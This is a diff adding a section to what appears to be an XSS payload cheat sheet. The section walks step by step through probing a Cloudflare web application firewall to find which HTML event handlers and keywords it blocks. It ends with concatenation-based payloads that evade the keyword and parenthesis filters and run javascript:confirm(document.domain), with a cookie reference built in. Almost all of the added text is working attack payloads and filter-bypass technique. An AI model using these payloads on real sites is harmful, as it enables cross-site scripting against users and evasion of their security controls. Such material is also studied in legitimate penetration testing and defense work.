@@ -104,6 +104,24 @@ javascript://%0aalert(1)
 
 
 
+// XSS WAF Bypass using location concatenation:
 
+// Fingerprinting WAF (Cloudflare)
+"><img src="x"> allowed
+"><img src=x onerror> blocked
+"><img src=x_onanything=""> not blocked // this shows blacklisting is being used.
+"><body onload> = not blocked
+"><body onload=> = blocked
+"><body onbeforescriptexecute=x> not blocked // auto executes X
+"><body onbeforescriptexecute=x()> = blocked
+"><body onbeforescriptexecute=x(> = not blocked // Regex based protection used for blocking parenthesis "><body onbefore scriptexecute=x``> blocked // no chance of back tiks
+"><body onbeforescriptexecute="location=javascript:"> blocked // javascript 
+keyword not allowed "><body onbefore scriptexecute="b='a';location='jav'+b+' script: "> not blocked
+"><BODY onbeforescriptexecute="c=')';b='a';location='jav'+b+'script:x('+c"> not blocked
+// this sets location="javascript:x()" which bypasses keyword based and parenthesis filteration.
+
+Keywords such as confirm, alert, prompt, document. were blocked. The same technique can be used to concatenate these keywords:
+"><BODY onbeforescriptexecute="x1='cookie'; c=') '; b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'+x1+c">
+Result: location="javascript:confirm(document.domain)"
 
 
